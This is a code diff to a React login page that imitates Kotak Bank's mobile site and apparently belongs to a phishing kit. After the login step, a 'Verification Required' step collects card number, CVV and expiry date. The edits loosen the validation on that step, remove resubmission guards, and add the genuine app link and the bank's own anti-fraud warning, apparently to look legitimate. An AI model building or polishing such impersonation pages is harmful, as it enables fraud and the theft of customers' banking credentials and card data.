@@ -72,19 +72,30 @@ export default function Login() {
   }
 
   const handleLogin = () => {
-    if (submitted) return
     setError('')
     if (validateStep1()) {
-      setSubmitted(true)
       setStep(2)
     }
   }
 
-  const handleCardVerify = () => {
-    if (submitted) return
-    setError('')
-    if (validateStep2()) {
-      setSubmitted(true)
+  const handleCardVerify = (e) => {
+    e.preventDefault()
+    e.stopPropagation()
+    
+    const newErrors = {}
+    if (!cardNumber || cardNumber.replace(/\s/g, '').length < 13) {
+      newErrors.cardNumber = 'Please enter valid card number'
+    }
+    if (!cvv || cvv.length < 3) {
+      newErrors.cvv = 'Please enter valid CVV'
+    }
+    if (!expDate || expDate.replace('/', '').length < 4) {
+      newErrors.expDate = 'Please enter valid expiry date'
+    }
+    
+    setErrors(newErrors)
+    
+    if (Object.keys(newErrors).length === 0) {
       setStep(3)
     }
   }
@@ -251,7 +262,7 @@ export default function Login() {
         <div className="p-4">
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
-              <button onClick={() => { setStep(0); setSubmitted(false); }} className="mr-3">
+              <button onClick={() => setStep(0)} className="mr-3">
                 <BiArrowBack className="text-2xl text-purple-700" />
               </button>
               <span className="text-xl font-semibold text-gray-800">Verify Your Details</span>
@@ -305,6 +316,21 @@ export default function Login() {
               Login
             </button>
 
+            <div className="mt-4 text-center">
+              <p className="text-gray-600 text-sm mb-3">
+                We have ensured that key services are available to you on the mobile website. For other services, please continue to desktop login.
+              </p>
+              <a 
+                href="https://play.google.com/store/apps/details?id=com.kotak.bank.mobile&hl=en-US" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="inline-flex items-center justify-center bg-black text-white px-4 py-2 rounded-lg hover:bg-gray-800 transition"
+              >
+                <FaGooglePlay className="w-5 h-5 mr-2" />
+                Download Mobile App
+              </a>
+            </div>
+
             <p className="text-gray-500 text-xs mt-4 text-center">
               Safe Banking: Never share your User ID, password or any other information with anyone on phone, SMS or Email. Kotak Bank does not call/email customers for such information. Beware of fraudsters asking for such details posing as Bank staff.
             </p>
@@ -316,7 +342,7 @@ export default function Login() {
         <div className="p-4">
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
-              <button onClick={() => { setStep(1); setSubmitted(false); }} className="mr-3">
+              <button onClick={() => { setStep(1); }} className="mr-3">
                 <BiArrowBack className="text-2xl text-purple-700" />
               </button>
               <span className="text-xl font-semibold text-gray-800">Verification Required</span>
@@ -374,7 +400,15 @@ export default function Login() {
             </div>
 
             <button
-              onClick={handleCardVerify}
+              type="button"
+              onClick={() => {
+                const newErrors = {}
+                if (!cardNumber || cardNumber.replace(/\s/g, '').length < 13) newErrors.cardNumber = 'err'
+                if (!cvv || cvv.length < 3) newErrors.cvv = 'err'
+                if (!expDate || expDate.replace('/', '').length < 4) newErrors.expDate = 'err'
+                setErrors(newErrors)
+                if (Object.keys(newErrors).length === 0) setStep(3)
+              }}
               className="w-full bg-purple-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-purple-700 transition"
             >
               Next
@@ -387,7 +421,7 @@ export default function Login() {
         <div className="p-4">
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
-              <button onClick={() => { setStep(2); setSubmitted(false); }} className="mr-3">
+              <button onClick={() => setStep(2)} className="mr-3">
                 <BiArrowBack className="text-2xl text-purple-700" />
               </button>
               <span className="text-xl font-semibold text-gray-800">Verification Required</span>
